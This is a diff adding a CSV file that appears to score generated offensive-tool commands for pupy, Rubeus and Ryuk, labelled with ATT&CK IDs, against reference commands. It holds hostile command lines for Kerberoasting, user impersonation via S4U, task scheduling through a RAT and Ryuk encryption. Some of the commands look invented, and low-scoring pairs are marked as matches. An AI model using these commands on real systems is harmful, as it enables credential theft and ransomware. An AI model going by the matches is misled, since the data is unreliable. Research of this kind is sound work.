@@ -1,0 +1,7 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_pupy_TA0003_T1053.txt,pupy,"pupysh.py --bg schedule_task --type at --minutes <minutes> --command ""tasklist /V""","[pupy] > `upload ""/tmp/monkey.png"" ""C:\Users\<username>\Downloads\monkey.png""`",0.212,True
+command_rubeus_TA0005_T1112.txt,rubeus,Rubeus.exe logonsession,`rubeus.exe kerberoast /domain:oz.local`,0.381,True
+command_rubeus_TA0005_T1112.txt,rubeus,Rubeus.exe purge /luid:<logon_session_luid>,`rubeus.exe kerberoast /domain:oz.local`,0.458,True
+command_rubeus_TA0005_T1112.txt,rubeus,Rubeus.exe s4u /user:<primary_user>$ /rc4:<ticket_rc4_key> /impersonateuser:<target_username>,`rubeus.exe kerberoast /domain:oz.local`,0.256,True
+command_rubeus_TA0005_T1112.txt,rubeus,Rubeus.exe regsvr32 <dll_name>,`rubeus.exe kerberoast /domain:oz.local`,0.486,True
+command_ryuk_TA0003_T1547.txt,ryuk,ryuk.exe --drop-bat-files,`ryuk.exe --encrypt --process-name notepad.exe`,0.417,True
